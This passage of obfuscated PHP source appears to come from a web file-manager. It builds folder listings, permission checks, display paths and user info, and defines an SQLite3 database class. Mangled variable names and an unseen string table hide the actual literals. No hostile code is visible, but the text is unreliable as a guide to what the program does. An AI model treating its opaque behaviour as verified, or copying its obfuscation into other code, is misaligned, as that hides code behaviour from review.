$∂∞É™öØ[507] => $∏Á´üÔˆ[$∂∞É™öØ[507]]); } } } unset($¥ÑŒ±˛π); return $µûáÅÇ≥; } protected function _listAppendChildren(&$®≈åõ⁄è, $ë¢Úõ§–) { $ƒ∆íœÆ¬ =& $_SERVER[Á≈ ä ∞]; $ıÇîÖ®Ò = array(); $˛˛∑Ω¢º = array($ƒ∆íœÆ¬[217] => 0, $ƒ∆íœÆ¬[218] => 0); foreach ($®≈åõ⁄è as &$Ç√ºÅµ¸) { if (!$Ç√ºÅµ¸[$ƒ∆íœÆ¬[419]]) { continue; } $ıÇîÖ®Ò[] = $Ç√ºÅµ¸[$ƒ∆íœÆ¬[411]]; } unset($Ç√ºÅµ¸); if (!$ıÇîÖ®Ò) { return; } $√Ø€£º§ = array($ƒ∆íœÆ¬[441] => array($ƒ∆íœÆ¬[17], $ıÇîÖ®Ò), $ƒ∆íœÆ¬[440] => 0); $·ΩãÑ‹Õ = array($ƒ∆íœÆ¬[441], $ƒ∆íœÆ¬[419], $ƒ∆íœÆ¬[508] => $ƒ∆íœÆ¬[509]); $Ãë◊µÎ˝ = $this->field($·ΩãÑ‹Õ)->where($√Ø€£º§)->group($ƒ∆íœÆ¬[510])->select(); $∆Åû´ùû = array(); foreach ($Ãë◊µÎ˝ as $¥¨¶ÁƒÇ) { $˜æ™ùµ¬ = $¥¨¶ÁƒÇ[$ƒ∆íœÆ¬[441]]; $ß¯¶Éª© = $¥¨¶ÁƒÇ[$ƒ∆íœÆ¬[419]] == $ƒ∆íœÆ¬[98] ? $ƒ∆íœÆ¬[218] : $ƒ∆íœÆ¬[217]; if (!isset($∆Åû´ùû[$˜æ™ùµ¬])) { $∆Åû´ùû[$˜æ™ùµ¬] = array($ƒ∆íœÆ¬[217] => 0, $ƒ∆íœÆ¬[218] => 0); } $∆Åû´ùû[$˜æ™ùµ¬][$ß¯¶Éª©] += $¥¨¶ÁƒÇ[$ƒ∆íœÆ¬[509]]; } foreach ($®≈åõ⁄è as &$Ç√ºÅµ¸) { if (!$Ç√ºÅµ¸[$ƒ∆íœÆ¬[419]]) { continue; } $Á˘∏¶Á« = is_array($∆Åû´ùû[$Ç√ºÅµ¸[$ƒ∆íœÆ¬[411]]]) ? $∆Åû´ùû[$Ç√ºÅµ¸[$ƒ∆íœÆ¬[411]]] : $˛˛∑Ω¢º; $Ç√ºÅµ¸[$ƒ∆íœÆ¬[218]] = $Á˘∏¶Á«[$ƒ∆íœÆ¬[218]]; $Ç√ºÅµ¸[$ƒ∆íœÆ¬[217]] = $Á˘∏¶Á«[$ƒ∆íœÆ¬[217]]; unset($Ç√ºÅµ¸[$ƒ∆íœÆ¬[421]]); } unset($Ç√ºÅµ¸); } protected function _listAppendAuth(&$˝Ò∆åÇ˝) { $ÜÆñô≠¯ =& $_SERVER[Á≈ ä ∞]; if (!defined($ÜÆñô≠¯[484])) { return; } $ °À˘¬ = array(); foreach ($˝Ò∆åÇ˝ as $öÚêÌ∑à) { if ($öÚêÌ∑à[$ÜÆñô≠¯[420]] == self::TYPE_GROUP) { $ °À˘¬[] = $öÚêÌ∑à[$ÜÆñô≠¯[411]]; } } if (!$ °À˘¬) { return; } $≤Ï≤¢Æπ = array_to_keyvalue($˝Ò∆åÇ˝, $ÜÆñô≠¯[411]); $˜©Çà‘˙ = Model($ÜÆñô≠¯[511])->getSourceList($ °À˘¬, $≤Ï≤¢Æπ); $◊‹πÅíË = $GLOBALS[$ÜÆñô≠¯[512]] == 1; foreach ($˝Ò∆åÇ˝ as $∏ûëÒπ => &$öÚêÌ∑à) { $öÚêÌ∑à[$ÜÆñô≠¯[422]] = $˜©Çà‘˙[$öÚêÌ∑à[$ÜÆñô≠¯[411]]]; if (!$öÚêÌ∑à[$ÜÆñô≠¯[422]] && $öÚêÌ∑à[$ÜÆñô≠¯[420]] == self::TYPE_GROUP) { $öÚêÌ∑à[$ÜÆñô≠¯[422]] = Action($ÜÆñô≠¯[513])->pathGroupAuthMake($öÚêÌ∑à[$ÜÆñô≠¯[514]]); if (!$öÚêÌ∑à[$ÜÆñô≠¯[422]] && !$◊‹πÅíË) { $öÚêÌ∑à[$ÜÆñô≠¯[212]] = !1; $öÚêÌ∑à[$ÜÆñô≠¯[211]] = !1; } } if ($öÚêÌ∑à[$ÜÆñô≠¯[422]]) { $öÚêÌ∑à[$ÜÆñô≠¯[212]] = AuthModel::authCheckEdit($öÚêÌ∑à[$ÜÆñô≠¯[422]][$ÜÆñô≠¯[423]]); $öÚêÌ∑à[$ÜÆñô≠¯[211]] = AuthModel::authCheckView($öÚêÌ∑à[$ÜÆñô≠¯[422]][$ÜÆñô≠¯[423]]); } $this->groupPathDisplay($öÚêÌ∑à); } unset($öÚêÌ∑à); } public function _listAppendAuthSecret(&$ê≤õ¿π¶) { $ÔÇê—™≠ =& $_SERVER[Á≈ ä ∞]; if (Model($ÔÇê—™≠[444])->get($ÔÇê—™≠[515]) != $ÔÇê—™≠[98]) { return; } static $ﬂã‘◊Äç = false; if (!$ﬂã‘◊Äç) { $µ≤©ƒ¬≥ = Model($ÔÇê—™≠[516]); $üÇÌÎ—É = Model($ÔÇê—™≠[517]); $ﬂã‘◊Äç = $üÇÌÎ—É->listData(); $ﬂã‘◊Äç = array_to_keyvalue($ﬂã‘◊Äç, $ÔÇê—™≠[411]); $¿ãÅ‚© = json_decode(Model($ÔÇê—™≠[444])->get($ÔÇê—™≠[518]), !0); $¿ãÅ‚© = array_to_keyvalue($¿ãÅ‚©, $ÔÇê—™≠[408]); foreach ($ﬂã‘◊Äç as $∏ª⁄øöË => $∆≥ú¸œ’) { $•Ü´±Á÷ = $¿ãÅ‚©[$∆≥ú¸œ’[$ÔÇê—™≠[519]]]; if (!$•Ü´±Á÷) { $üÇÌÎ—É->remove($∆≥ú¸œ’[$ÔÇê—™≠[408]]); unset($ﬂã‘◊Äç[$∏ª⁄øöË]); continue; } $éç∏˛Ö€ = $µ≤©ƒ¬≥->listData($•Ü´±Á÷[$ÔÇê—™≠[422]]); if (!$éç∏˛Ö€) { $üÇÌÎ—É->remove($∆≥ú¸œ’[$ÔÇê—™≠[408]]); unset($ﬂã‘◊Äç[$∏ª⁄øöË]); continue; } $∆≥ú¸œ’[$ÔÇê—™≠[422]] = $éç∏˛Ö€; $∆≥ú¸œ’[$ÔÇê—™≠[520]] = $•Ü´±Á÷; $∆≥ú¸œ’[$ÔÇê—™≠[521]] = Model($ÔÇê—™≠[522])->getInfoSimpleOuter($∆≥ú¸œ’[$ÔÇê—™≠[463]]); $ﬂã‘◊Äç[$∏ª⁄øöË] = $∆≥ú¸œ’; } } $ÔóÏﬁü… = defined($ÔÇê—™≠[523]) ? USER_ID : $ÔÇê—™≠[22]; $—ØâÅªÒ = array(); $‹Ó°ﬂ„√ = $this->_listAppendPath($—ØâÅªÒ, !0); foreach ($ê≤õ¿π¶ as $∏ª⁄øöË => &$∆≥ú¸œ’) { if (!is_array($∆≥ú¸œ’[$ÔÇê—™≠[422]])) { continue; } if ($∆≥ú¸œ’[$ÔÇê—™≠[420]] != $ÔÇê—™≠[524]) { continue; } if (isset($ﬂã‘◊Äç[$∆≥ú¸œ’[$ÔÇê—™≠[411]]])) { $·€«óâ• = $ﬂã‘◊Äç[$∆≥ú¸œ’[$ÔÇê—™≠[411]]]; if (!is_array($∆≥ú¸œ’[$ÔÇê—™≠[475]])) { $∆≥ú¸œ’[$ÔÇê—™≠[475]] = array(); } $∆≥ú¸œ’[$ÔÇê—™≠[475]][$ÔÇê—™≠[525]] = $·€«óâ•[$ÔÇê—™≠[519]]; $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[526]] = $·€«óâ•; $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[527]] = $∆≥ú¸œ’[$ÔÇê—™≠[528]]; $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[529]] = $ÔÇê—™≠[98]; if ($·€«óâ•[$ÔÇê—™≠[463]] != $ÔóÏﬁü…) { $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[423]] = $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[423]] & $·€«óâ•[$ÔÇê—™≠[422]][$ÔÇê—™≠[422]]; } continue; } $É—≈≈àÉ = $this->parentLevelArray($∆≥ú¸œ’[$ÔÇê—™≠[530]]); $Ã˘ØÜ‹ë = array_reverse($É—≈≈àÉ); foreach ($Ã˘ØÜ‹ë as $ˆΩñÒÜÂ => $È≤ßÜ¿ë) { if (!isset($ﬂã‘◊Äç[$È≤ßÜ¿ë])) { continue; } $·€«óâ• = $ﬂã‘◊Äç[$È≤ßÜ¿ë]; $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[526]] = $·€«óâ•; if ($·€«óâ•[$ÔÇê—™≠[463]] != $ÔóÏﬁü…) { $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[423]] = $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[423]] & $·€«óâ•[$ÔÇê—™≠[422]][$ÔÇê—™≠[422]]; } $èã∏ûü≤ = $ÔÇê—™≠[22]; $ø“ÿÁ¸Ò = count($É—≈≈àÉ) - $ˆΩñÒÜÂ; for ($˙˘ÜóÂ⁄ = 0; $˙˘ÜóÂ⁄ < $ø“ÿÁ¸Ò; $˙˘ÜóÂ⁄++) { if (!isset($‹Ó°ﬂ„√[$É—≈≈àÉ[$˙˘ÜóÂ⁄]])) { $èã∏ûü≤ = $ÔÇê—™≠[22]; break; } $èã∏ûü≤ = $èã∏ûü≤ . rtrim($‹Ó°ﬂ„√[$É—≈≈àÉ[$˙˘ÜóÂ⁄]], $ÔÇê—™≠[18]) . $ÔÇê—™≠[18]; } $∆≥ú¸œ’[$ÔÇê—™≠[422]][$ÔÇê—™≠[527]] = rtrim($èã∏ûü≤, $ÔÇê—™≠[18]) . $ÔÇê—™≠[18]; break; } } unset($∆≥ú¸œ’); } public function groupPathDisplay(&$ Ó–∑è˝) { $—–ÛäΩ¯ =& $_SERVER[Á≈ ä ∞]; if ($ Ó–∑è˝[$—–ÛäΩ¯[420]] != self::TYPE_GROUP) { return; } $µìÊ¨∆∑ = Model($—–ÛäΩ¯[531])->getInfo($ Ó–∑è˝[$—–ÛäΩ¯[514]]); $◊º›ä¯¬ = $this->parentLevelArray($µìÊ¨∆∑[$—–ÛäΩ¯[530]]); $Ÿ˚‡‚Ëœ = $—–ÛäΩ¯[22]; foreach ($◊º›ä¯¬ as $¡Ì®˛ëü) { $∏Ï’™å– = Model($—–ÛäΩ¯[531])->getInfo($¡Ì®˛ëü); $Ÿ˚‡‚Ëœ .= $∏Ï’™å–[$—–ÛäΩ¯[96]][$—–ÛäΩ¯[411]] . $—–ÛäΩ¯[60]; } $ Ó–∑è˝[$—–ÛäΩ¯[532]] = $µìÊ¨∆∑[$—–ÛäΩ¯[441]]; $ Ó–∑è˝[$—–ÛäΩ¯[533]] = $µìÊ¨∆∑[$—–ÛäΩ¯[530]]; $ Ó–∑è˝[$—–ÛäΩ¯[534]] = $µìÊ¨∆∑[$—–ÛäΩ¯[535]]; $ Ó–∑è˝[$—–ÛäΩ¯[536]] = $Ÿ˚‡‚Ëœ . $µìÊ¨∆∑[$—–ÛäΩ¯[96]][$—–ÛäΩ¯[411]]; } protected function _listAppendPath(&$∫•ìƒß§, $Åü≥¢™÷ = false) { $•⁄“®øƒ =& $_SERVER[Á≈ ä ∞]; static $§µ©ÎÒœ = array(); $î©ôÿ≠¥ = array(); $≥ˆøå’˝ = array(); if ($Åü≥¢™÷) { return $§µ©ÎÒœ; } foreach ($∫•ìƒß§ as &$∆ıÀÿÆÈ) { $Á‰·é·˝ = $∆ıÀÿÆÈ[$•⁄“®øƒ[411]]; if ($∆ıÀÿÆÈ[$•⁄“®øƒ[419]] == $•⁄“®øƒ[98] && $∆ıÀÿÆÈ[$•⁄“®øƒ[441]] != 0) { $§µ©ÎÒœ[$Á‰·é·˝] = $∆ıÀÿÆÈ[$•⁄“®øƒ[42]]; } if ($∆ıÀÿÆÈ[$•⁄“®øƒ[419]] == $•⁄“®øƒ[98] && $∆ıÀÿÆÈ[$•⁄“®øƒ[441]] == 0 && !isset($§µ©ÎÒœ[$Á‰·é·˝])) { $§µ©ÎÒœ[$Á‰·é·˝] = $this->_listAppendPathRoot($∆ıÀÿÆÈ, array()); } if (isset($≥ˆøå’˝[$∆ıÀÿÆÈ[$•⁄“®øƒ[530]]])) { continue; } $≥ˆøå’˝[$∆ıÀÿÆÈ[$•⁄“®øƒ[530]]] = !0; $ããÓ≈àÿ = $this->parentLevelArray($∆ıÀÿÆÈ[$•⁄“®øƒ[530]]); foreach ($ããÓ≈àÿ as $≠ù≤Ù€á => $µù∆òêû) { if (isset($§µ©ÎÒœ[$µù∆òêû])) { continue; } if ($≠ù≤Ù€á == 0) { $§µ©ÎÒœ[$µù∆òêû] = $this->_listAppendPathRoot($∆ıÀÿÆÈ, $ããÓ≈àÿ); } if ($≠ù≤Ù€á != 0) { $î©ôÿ≠¥[] = $µù∆òêû; } } } unset($∆ıÀÿÆÈ); $î©ôÿ≠¥ = array_unique($î©ôÿ≠¥); if (count($î©ôÿ≠¥) > 0) { $Ùè¯Ã◊î = array($•⁄“®øƒ[426] => array($•⁄“®øƒ[427], $î©ôÿ≠¥)); if (count($î©ôÿ≠¥) == 1) { $§çπº∞⁄ = $this->sourceInfo($î©ôÿ≠¥[0]); $¸˜‡÷†ë = is_array($§çπº∞⁄) ? array($§çπº∞⁄) : !1; } else { $¸˜‡÷†ë = $this->field($•⁄“®øƒ[537])->where($Ùè¯Ã◊î)->select(); } if (!$¸˜‡÷†ë) { $¸˜‡÷†ë = array(); } foreach ($¸˜‡÷†ë as $≠ä∂ìØô) { $§µ©ÎÒœ[$≠ä∂ìØô[$•⁄“®øƒ[411]]] = $≠ä∂ìØô[$•⁄“®øƒ[42]]; } } $õ™ÿˆÓí = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $øÃŒ‰Ã˚ = array(); foreach ($∫•ìƒß§ as &$∆ıÀÿÆÈ) { $Ñ‹õø∏â = $∆ıÀÿÆÈ[$•⁄“®øƒ[530]]; $∏©çÇ˚‹ = $•⁄“®øƒ[22]; if (isset($øÃŒ‰Ã˚[$Ñ‹õø∏â])) { $∏©çÇ˚‹ = $øÃŒ‰Ã˚[$Ñ‹õø∏â]; } else { $ããÓ≈àÿ = $this->parentLevelArray($∆ıÀÿÆÈ[$•⁄“®øƒ[530]]); foreach ($ããÓ≈àÿ as $≠ù≤Ù€á => $µù∆òêû) { if (isset($§µ©ÎÒœ[$µù∆òêû])) { $∏©çÇ˚‹ .= $§µ©ÎÒœ[$µù∆òêû] . $•⁄“®øƒ[18]; } } $øÃŒ‰Ã˚[$Ñ‹õø∏â] = $∏©çÇ˚‹; } $∏©çÇ˚‹ .= $∆ıÀÿÆÈ[$•⁄“®øƒ[42]]; if ($∆ıÀÿÆÈ[$•⁄“®øƒ[419]] == $•⁄“®øƒ[98]) { $∏©çÇ˚‹ .= $•⁄“®øƒ[18]; } $∆ıÀÿÆÈ[$•⁄“®øƒ[528]] = str_replace($•⁄“®øƒ[538], $•⁄“®øƒ[18], $∏©çÇ˚‹); if ($∆ıÀÿÆÈ[$•⁄“®øƒ[441]] == $•⁄“®øƒ[207]) { $∆ıÀÿÆÈ[$•⁄“®øƒ[42]] = trim($§µ©ÎÒœ[$∆ıÀÿÆÈ[$•⁄“®øƒ[411]]], $•⁄“®øƒ[18]); $∆ıÀÿÆÈ[$•⁄“®øƒ[528]] = $∆ıÀÿÆÈ[$•⁄“®øƒ[42]] . $•⁄“®øƒ[18]; } if (intval($∆ıÀÿÆÈ[$•⁄“®øƒ[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($∆ıÀÿÆÈ, $ããÓ≈àÿ, $õ™ÿˆÓí); } } unset($∆ıÀÿÆÈ); return $∫•ìƒß§; } private function _listAppendPathRecycle(&$î‹€´º…, $âı†èÒµ, $àçàﬁ‰Ó) { $ÀÓ¸©îÜ =& $_SERVER[Á≈ ä ∞]; if (!in_array($àçàﬁ‰Ó, $âı†èÒµ) && $î‹€´º…[$ÀÓ¸©îÜ[411]] != $àçàﬁ‰Ó) { return; } $Ò»œò¢ª = explode($ÀÓ¸©îÜ[18], trim($î‹€´º…[$ÀÓ¸©îÜ[528]], $ÀÓ¸©îÜ[18])); $Ù˛ã«£¸ = implode($ÀÓ¸©îÜ[18], array_slice($Ò»œò¢ª, 2)); $î‹€´º…[$ÀÓ¸©îÜ[528]] = $ÀÓ¸©îÜ[18] . LNG($ÀÓ¸©îÜ[539]) . $ÀÓ¸©îÜ[18] . ltrim($Ù˛ã«£¸, $ÀÓ¸©îÜ[18]); $î‹€´º…[$ÀÓ¸©îÜ[530]] = $ÀÓ¸©îÜ[540] . implode($ÀÓ¸©îÜ[60], array_slice($âı†èÒµ, 1)) . $ÀÓ¸©îÜ[60]; if ($î‹€´º…[$ÀÓ¸©îÜ[411]] == $àçàﬁ‰Ó) { $î‹€´º…[$ÀÓ¸©îÜ[530]] = $ÀÓ¸©îÜ[540]; $î‹€´º…[$ÀÓ¸©îÜ[441]] = $ÀÓ¸©îÜ[207]; $î‹€´º…[$ÀÓ¸©îÜ[42]] = LNG($ÀÓ¸©îÜ[539]); } $î‹€´º…[$ÀÓ¸©îÜ[541]] = $ÀÓ¸©îÜ[542]; } protected function _listAppendPathRoot(&$í§…ùî©, $ﬁﬁÇ«∏º) { $‘ø˝Ó∏‹ =& $_SERVER[Á≈ ä ∞]; static $—ÅÒÂ≠Ó = false; $˛óÁ¸ıÂ = $‘ø˝Ó∏‹[22]; if ($í§…ùî©[$‘ø˝Ó∏‹[420]] == self::TYPE_USER) { if (defined($‘ø˝Ó∏‹[484]) && $í§…ùî©[$‘ø˝Ó∏‹[514]] == USER_ID) { $˛óÁ¸ıÂ = LNG($‘ø˝Ó∏‹[543]); if ($—ÅÒÂ≠Ó === !1) { $€ãÍ ÌÜ = Model($‘ø˝Ó∏‹[544])->getInfoFull(USER_ID); $—ÅÒÂ≠Ó = _get($€ãÍ ÌÜ, $‘ø˝Ó∏‹[545], $‘ø˝Ó∏‹[22]); } if ($ﬁﬁÇ«∏º && $ﬁﬁÇ«∏º[0] == $—ÅÒÂ≠Ó || !$ﬁﬁÇ«∏º && $í§…ùî©[$‘ø˝Ó∏‹[411]] == $—ÅÒÂ≠Ó) { $˛óÁ¸ıÂ = LNG($‘ø˝Ó∏‹[546]); $í§…ùî©[$‘ø˝Ó∏‹[547]] = $‘ø˝Ó∏‹[548]; } if (!$ﬁﬁÇ«∏º) { $í§…ùî©[$‘ø˝Ó∏‹[42]] = $˛óÁ¸ıÂ; } } else { $œºñÏ√‘ = Model($‘ø˝Ó∏‹[522])->getInfoSimple($í§…ùî©[$‘ø˝Ó∏‹[514]]); $˛óÁ¸ıÂ = LNG($‘ø˝Ó∏‹[549]) . $‘ø˝Ó∏‹[172] . $œºñÏ√‘[$‘ø˝Ó∏‹[42]] . $‘ø˝Ó∏‹[174]; $í§…ùî©[$‘ø˝Ó∏‹[550]] = array($‘ø˝Ó∏‹[42] => $œºñÏ√‘[$‘ø˝Ó∏‹[42]], $‘ø˝Ó∏‹[551] => $œºñÏ√‘[$‘ø˝Ó∏‹[551]], $‘ø˝Ó∏‹[552] => $œºñÏ√‘[$‘ø˝Ó∏‹[552]]); } } else { if ($í§…ùî©[$‘ø˝Ó∏‹[420]] == self::TYPE_GROUP) { $œºñÏ√‘ = Model($‘ø˝Ó∏‹[531])->getInfoSimple($í§…ùî©[$‘ø˝Ó∏‹[514]]); $˛óÁ¸ıÂ = $œºñÏ√‘[$‘ø˝Ó∏‹[42]]; } else { if ($í§…ùî©[$‘ø˝Ó∏‹[420]] == self::TYPE_SYSTEM) { $˛óÁ¸ıÂ = $‘ø˝Ó∏‹[553]; } } } $˛óÁ¸ıÂ = $˛óÁ¸ıÂ ? $‘ø˝Ó∏‹[18] . $˛óÁ¸ıÂ . $‘ø˝Ó∏‹[18] : $‘ø˝Ó∏‹[18]; return $˛óÁ¸ıÂ; } protected function _listAppendUser(&$é“î˝—Œ) { $û≠âñ„Ü =& $_SERVER[Á≈ ä ∞]; $æº∞˜ıä = array_to_keyvalue($é“î˝—Œ, $û≠âñ„Ü[22], $û≠âñ„Ü[463]); $ÛÃö≠≈ã = array_to_keyvalue($é“î˝—Œ, $û≠âñ„Ü[22], $û≠âñ„Ü[465]); $∂Öÿ»ÉŸ = array_merge($æº∞˜ıä, $ÛÃö≠≈ã); $⁄˜´È∂è = Model($û≠âñ„Ü[544])->userListInfo($∂Öÿ»ÉŸ); foreach ($é“î˝—Œ as &$˙â¥éËˆ) { $˚ûÓõ©∆ = $˙â¥éËˆ[$û≠âñ„Ü[463]]; $˙â¥éËˆ[$û≠âñ„Ü[463]] = $⁄˜´È∂è[$˚ûÓõ©∆] ? $⁄˜´È∂è[$˚ûÓõ©∆] : !1; $˚ûÓõ©∆ = $˙â¥éËˆ[$û≠âñ„Ü[465]]; $˙â¥éËˆ[$û≠âñ„Ü[465]] = $⁄˜´È∂è[$˚ûÓõ©∆] ? $⁄˜´È∂è[$˚ûÓõ©∆] : !1; if (isset($˙â¥éËˆ[$û≠âñ„Ü[475]]) && $˙â¥éËˆ[$û≠âñ„Ü[475]][$û≠âñ„Ü[554]]) { $»È¡ïÀ• = $GLOBALS[$û≠âñ„Ü[16]][$û≠âñ„Ü[99]][$û≠âñ„Ü[555]]; if ($˙â¥éËˆ[$û≠âñ„Ü[475]][$û≠âñ„Ü[556]] <= time() - $»È¡ïÀ•) { $this->metaSet($˙â¥éËˆ[$û≠âñ„Ü[411]], $û≠âñ„Ü[554], null); $this->metaSet($˙â¥éËˆ[$û≠âñ„Ü[411]], $û≠âñ„Ü[556], null); unset($˙â¥éËˆ[$û≠âñ„Ü[475]][$û≠âñ„Ü[554]]); continue; } $Ó–«˚©è = $˙â¥éËˆ[$û≠âñ„Ü[475]][$û≠âñ„Ü[554]]; $˙â¥éËˆ[$û≠âñ„Ü[475]][$û≠âñ„Ü[557]] = Model($û≠âñ„Ü[544])->getInfoSimpleOuter($Ó–«˚©è); } } unset($˙â¥éËˆ); } public function parentLevelArray($‡∂∆Å¢Â) { $ö˝ä∫©ô =& $_SERVER[Á≈ ä ∞]; $‡∂∆Å¢Â = explode($ö˝ä∫©ô[60], trim($‡∂∆Å¢Â, $ö˝ä∫©ô[60])); return array_remove_value($‡∂∆Å¢Â, $ö˝ä∫©ô[207]); } public function listAll($çÎáÕÚ¸) { $¿éÍÓ…ç =& $_SERVER[Á≈ ä ∞]; $∏êÏ˜ã¥ = $this->sourceInfo($çÎáÕÚ¸); $·ÌÙò•Æ = array($¿éÍÓ…ç[558] => array($¿éÍÓ…ç[559], $∏êÏ˜ã¥[$¿éÍÓ…ç[530]] . $çÎáÕÚ¸ . $¿éÍÓ…ç[560]), $¿éÍÓ…ç[561] => 0); $ÌãØÆ∞œ = $¿éÍÓ…ç[562]; $Üæ˘ÒÍß = "\x4c\105\106\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\157\x5f\146\x69\x6c\145\40\x66\151\154\145\40\157\156\x20\163\x6f\165\x72\143\x65\x2e\x66\x69\x6c\145\x49\104\x20\x3d\40\146\x69\154\x65\x2e\146\151\x6c\145\x49\104"; $ı‹¿™˝¸ = $this->alias($¿éÍÓ…ç[455])->field($ÌãØÆ∞œ)->where($·ÌÙò•Æ)->join($Üæ˘ÒÍß)->select(); $this->_listAppendAuth($ı‹¿™˝¸); $this->_listAppendUser($ı‹¿™˝¸); $this->_listAppendPath($ı‹¿™˝¸); $ı‹¿™˝¸ = array_to_keyvalue($ı‹¿™˝¸, $¿éÍÓ…ç[411]); $“¡Úå⁄Ú = "\57{$∏êÏ˜ã¥[$¿éÍÓ…ç[42]]}\x2f"; $“¡Úå⁄Ú = $“¡Úå⁄Ú == $¿éÍÓ…ç[538] ? $¿éÍÓ…ç[18] : $“¡Úå⁄Ú; $÷«∂√áÛ = array(); foreach ($ı‹¿™˝¸ as $˙íÖÑÀ˜ => $ø«ÙµÒœ) { $ÌÇ§êËÇ = $this->parentLevelArray($ø«ÙµÒœ[$¿éÍÓ…ç[530]]); array_shift($ÌÇ§êËÇ); $√¯¸¿¢ä = $“¡Úå⁄Ú; for ($Ÿ◊ì˛Ò¥ = 0; $Ÿ◊ì˛Ò¥ < count($ÌÇ§êËÇ); $Ÿ◊ì˛Ò¥++) { $√¯¸¿¢ä .= $ı‹¿™˝¸[$ÌÇ§êËÇ[$Ÿ◊ì˛Ò¥]][$¿éÍÓ…ç[42]] . $¿éÍÓ…ç[18]; } $√¯¸¿¢ä .= $ø«ÙµÒœ[$¿éÍÓ…ç[42]]; if ($ø«ÙµÒœ[$¿éÍÓ…ç[419]]) { $√¯¸¿¢ä .= $¿éÍÓ…ç[18]; } $√¯¸¿¢ä = str_replace($¿éÍÓ…ç[538], $¿éÍÓ…ç[18], $√¯¸¿¢ä); $√¯¸¿¢ä = str_replace($¿éÍÓ…ç[538], $¿éÍÓ…ç[18], $√¯¸¿¢ä); $õ¥”≠Ïó = array($¿éÍÓ…ç[430] => str_replace($¿éÍÓ…ç[538], $¿éÍÓ…ç[18], $√¯¸¿¢ä), $¿éÍÓ…ç[563] => intval($ø«ÙµÒœ[$¿éÍÓ…ç[419]]), $¿éÍÓ…ç[96] => $this->pathInfoFilter($ø«ÙµÒœ)); if (!$ø«ÙµÒœ[$¿éÍÓ…ç[419]]) { $õ¥”≠Ïó[$¿éÍÓ…ç[477]] = $ø«ÙµÒœ[$¿éÍÓ…ç[477]]; $õ¥”≠Ïó[$¿éÍÓ…ç[97]] = $ø«ÙµÒœ[$¿éÍÓ…ç[94]]; } $÷«∂√áÛ[] = $õ¥”≠Ïó; } return $÷«∂√áÛ; } } goto D ƒóéÖ°ä; AÉ¬‰ëüÃ: class DbSqlite3Base extends Db { public function __construct($◊úé‚õÈ = '') { $ã´º ◊´ =& $_SERVER[Á≈ ä ∞]; if (!class_exists($ã´º ◊´[64])) { think_exception(think_lang($ã´º ◊´[24]) . $ã´º ◊´[65]); } if (!empty($◊úé‚õÈ)) { if (!isset($◊úé‚õÈ[$ã´º ◊´[26]])) { $◊úé‚õÈ[$ã´º ◊´[26]] = 438; } $this->config = $◊úé‚õÈ; if (empty($this->config[$ã´º ◊´[27]])) { $this->config[$ã´º ◊´[27]] = array(); } } } public function connect($êó÷˝√· = '', $—‰ùˆöá = 0) { $£¿ùˆ  =& $_SERVER[Á≈ ä ∞]; if (!isset($this->linkID[$—‰ùˆöá])) { if (empty($êó÷˝√·)) { $êó÷˝√· = $this->config; } $this->linkID[$—‰ùˆöá] = new SQLite3($êó÷˝√·[$£¿ùˆ [31]]); if (!$this->linkID[$—‰ùˆöá]) { think_exception($this->linkID[$—‰ùˆöá]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$—‰ùˆöá]->busyTimeout(30000); if (1 != think_config($£¿ùˆ [32])) { unset($this->config); } } return $this->linkID[$—‰ùˆöá]; } public function free() { $this->queryID = null; } public function query($‰ûÒ¢©Ç) { $·ﬂ¢≠ò» =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰ûÒ¢©Ç; if ($this->queryID) { $this->free(); } think_action_status($·ﬂ¢≠ò»[33], 1); think_status($·ﬂ¢≠ò»[34]); $this->queryID = $this->_linkID->query($‰ûÒ¢©Ç); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $·◊´ÚÔ˛ = $this->getAll(); $this->numRows = count($·◊´ÚÔ˛); return $·◊´ÚÔ˛; } } public function execute($ﬁú·¡≤’) { $ÑìÖÈÔ— =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ﬁú·¡≤’; if ($this->queryID) { $this->free(); } think_action_status($ÑìÖÈÔ—[35], 1); think_status($ÑìÖÈÔ—[34]); $Ω´£Øü£ = $this->_linkID->exec($ﬁú·¡≤’); $this->debug(); if (!1 === $Ω´£Øü£) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Á≈ ä ∞][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˙∆„‚Î› = $this->_linkID->query($_SERVER[Á≈ ä ∞][37]); if (!$˙∆„‚Î›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ùÎé”π® = $this->_linkID->query($_SERVER[Á≈ ä ∞][38]); if (!$ùÎé”π®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $∏“ ˘ﬁî = array(); while ($–¯•∑œ∑ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $∏“ ˘ﬁî[] = $–¯•∑œ∑; } $this->queryID->reset(); return $∏“ ˘ﬁî; } public function getFields($Éä¸Èπå) { $™Ã±ï‚° =& $_SERVER[Á≈ ä ∞]; $Ü†˚ùä∂ = $this->query($™Ã±ï‚°[39] . $Éä¸Èπå . $™Ã±ï‚°[40]); $ﬂ»„Ù⁄¸ = array(); if ($Ü†˚ùä∂) { foreach ($Ü†˚ùä∂ as $Íéº„ÂÛ => $Ç˙™›œß) { $ﬂ»„Ù⁄¸[$Ç˙™›œß[$™Ã±ï‚°[42]]] = array($™Ã±ï‚°[42] => 